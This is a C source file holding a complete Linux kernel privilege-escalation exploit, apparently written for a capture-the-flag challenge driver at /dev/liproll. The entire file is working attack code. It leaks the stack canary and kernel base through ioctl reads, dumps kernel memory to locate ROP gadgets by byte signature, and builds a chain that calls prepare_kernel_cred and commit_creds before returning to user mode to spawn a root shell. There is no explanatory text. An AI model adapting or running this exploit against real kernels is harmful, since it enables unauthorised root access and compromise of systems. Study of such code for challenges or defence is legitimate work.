#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#define CREATE 0xD3C7F03
#define CHOOSE 0xD3C7F04
#define RESET 0xD3C7F02
#define CAST 0xD3C7F01

void spawn_shell() {
    if(!getuid()) {
        system("/bin/sh");
    }
    else {
        puts("[*]spawn shell error!");
    }
    exit(0);
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}

typedef struct choose_args {
    unsigned int idx;
}choose_args;

typedef struct cast_args {
    u_int8_t *buf;
    unsigned int len;
}cast_args;

typedef struct gadgets_find {
    size_t prepare_kernel_cred;
    size_t commit_creds;
    size_t iretq_ret;
    size_t mov_rdi_rax_ret;
    size_t cmp_rdx_rcx;
    size_t pop_rdx_rcx;
}gadgets_find;

gadgets_find found;
int fd, m;
size_t rop[0x100], canary, vmlinux_base;
size_t pop_rdi_ret = 0x16a8;
size_t swapgs_popfq_ret = 0x200eaa;
size_t pop_rbx_ret = 0xb36;
u_int8_t code_iretq_ret[] = {0x48, 0xCF, 0xC3};
u_int8_t code_prepare_kernel_cred[] = {0x48, 0x89, 0xC5, 0x4C, 0x89, 0xE7, 0x48, 0x89, 0xEE, 0xB9, 0x15, 0x00, 0x00, 0x00, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xF3, 0x48, 0xA5, 0x41, 0xC7, 0x04, 0x24, 0x01, 0x00, 0x00, 0x00, 0x41, 0xC7};
u_int8_t code_commit_creds[] = {0x41, 0x54, 0x65, 0x4C, 0x8B, 0x24, 0x25, 0x00, 0x7D, 0x01, 0x00, 0x55, 0x53, 0x49, 0x8B, 0xAC, 0x24, 0x30, 0x06, 0x00, 0x00, 0x49, 0x39, 0xAC, 0x24, 0x38, 0x06, 0x00, 0x00, 0x0F, 0x85, 0xE2};
u_int8_t code_mov_rdi_rax_ret[] = {0x48, 0x89, 0xC7, 0x48, 0x85, 0xDB, 0x7F, 0xEA, 0x48, 0x89, 0xF8, 0x5B, 0xC3};
u_int8_t code_cmp_rdx_rcx[] = {0x48, 0x39, 0xCA, 0x74, 0x01, 0xC3};
u_int8_t code_pop_rdx_rcx[] = {0x5A, 0x59, 0xC3};

int machinecode_cmp(u_int8_t *a, u_int8_t *b, int n) {
    for (int i=0; i<n; i++) {
        if(a[i] != b[i]) {
            return 0;
        }
    }
    return 1;
}

void die(char *s) {
    perror(s);
    exit(-1);
}

void create() {
    ioctl(fd, CREATE, NULL);
}

void reset() {
    ioctl(fd, RESET, NULL);
}

void choose(unsigned int idx) {
    choose_args arg;
    arg.idx = idx;
    ioctl(fd, CHOOSE, &arg);
}

void cast(u_int8_t *buf, unsigned int len) {
    cast_args arg;
    arg.buf = buf;
    arg.len = len;
    ioctl(fd, CAST, &arg);
}

void gadgets_finder(u_int8_t *codes, int len) {
    for (int i = 0; i < len; i++) {
        if (found.cmp_rdx_rcx == 0 && \
            machinecode_cmp(codes+i, code_cmp_rdx_rcx, 6)) {
            found.cmp_rdx_rcx = i + 0x401160;
        }
        else if (found.commit_creds == 0 && \
            machinecode_cmp(codes+i, code_commit_creds, 32)) {
            found.commit_creds = i + 0x401160;
        }
        else if (found.iretq_ret == 0 && \
            machinecode_cmp(codes+i, code_iretq_ret, 3)) {
            found.iretq_ret = i + 0x401160;
        }
        else if (found.mov_rdi_rax_ret == 0 && \
            machinecode_cmp(codes+i, code_mov_rdi_rax_ret, 13)) {
            found.mov_rdi_rax_ret = i + 0x401160;
        }
        else if (found.prepare_kernel_cred == 0 && \
            machinecode_cmp(codes+i, code_prepare_kernel_cred, 32)) {
            found.prepare_kernel_cred = i + 0x401160 - 0x34;
        }
        else if (found.pop_rdx_rcx == 0 && \
            machinecode_cmp(codes+i, code_pop_rdx_rcx, 3)) {
            found.pop_rdx_rcx = i + 0x401160;
        }
    }
    printf("[*] found pop_rdx_rcx: 0x%llx\n", found.pop_rdx_rcx + vmlinux_base);
    printf("[*] found cmp_rdx_rcx: 0x%llx\n", found.cmp_rdx_rcx + vmlinux_base);
    printf("[*] found commit_creds: 0x%llx\n", found.commit_creds + vmlinux_base);
    printf("[*] found iretq_ret: 0x%llx\n", found.iretq_ret + vmlinux_base);
    printf("[*] found mov_rdi_rax_ret: 0x%llx\n", found.mov_rdi_rax_ret + vmlinux_base);
    printf("[*] found prepare_kernel_cred: 0x%llx\n", found.prepare_kernel_cred + vmlinux_base);
}

void gadgets_generator() {
    create();

    u_int8_t payload[0x200] = {0};
    u_int8_t *codes_dump = NULL;
    codes_dump = (u_int8_t *)malloc(0xacfdf0);
    if (codes_dump <= 0) {
        die("[-] malloc error.");
    }

    int cur = 0x401160, dump_end = 0xed1000;
    printf("[*] This is dumped code: %p\n", codes_dump);
    while(cur < dump_end) {
        choose(1);
        memset(payload, 0, sizeof(payload));
        *(size_t *)(payload + 0x100) = vmlinux_base + cur;
        *(int *)(payload + 0x108) = 0x100;
        cast(payload, 0x110);
        int temprecv = read(fd, codes_dump+cur-0x401160, 0x100);
        if(temprecv < 0) {
            die("[-] read error.");
        }
        cur += temprecv;
    }
    
    printf("[+] start finding gadgets when length is: 0x%x\n", cur);
    gadgets_finder(codes_dump, cur-0x401160);

    m = 0x110 / 8;
    rop[m++] = canary;
    rop[m++] = 0xdeadbeef;
    
    /*
        prepare_kernel_cred(0);
    */
    rop[m++] = pop_rdi_ret + vmlinux_base;
    rop[m++] = 0;
    rop[m++] = found.prepare_kernel_cred + vmlinux_base;

    /*
        commit_creds(prepare_kernel_cred(0));
    */
    rop[m++] = found.pop_rdx_rcx + vmlinux_base;
    rop[m++] = 1;
    rop[m++] = 2;
    rop[m++] = found.cmp_rdx_rcx + vmlinux_base;
    rop[m++] = pop_rbx_ret + vmlinux_base;
    rop[m++] = 0;
    rop[m++] = found.mov_rdi_rax_ret + vmlinux_base;
    rop[m++] = 0;
    rop[m++] = found.commit_creds + vmlinux_base;

    /*
        switch to kernel;
    */
    rop[m++] = swapgs_popfq_ret + vmlinux_base;
    rop[m++] = 0;
    rop[m++] = found.iretq_ret + vmlinux_base;

    rop[m++] = (size_t)spawn_shell;         // rip 

    rop[m++] = user_cs;
    rop[m++] = user_rflags;
    rop[m++] = user_sp;
    rop[m++] = user_ss;
}

int main() {
    fd = open("/dev/liproll", O_RDWR);
    if (fd <= 0) {
        die("[-] open device error.");
    }
    
    save_status();
    create();
    choose(0);
    size_t rcv[0x100] = {0};
    read(fd, (void *)rcv, 0x40 * 8);
    for(int i=0; i<0x40; i++) {
        printf("[+] received rcv[%d]: 0x%llx\n", i, rcv[i]);
    }
    canary = rcv[32];
    vmlinux_base = rcv[52] - 0x20007c;
    printf("[+] leak canary: 0x%llx\n", canary);
    printf("[+] leak vmlinux_base: 0x%llx\n", vmlinux_base+0x401160);

    gadgets_generator();

    reset();
    choose(0);
    cast((u_int8_t *)rop, m*8);
}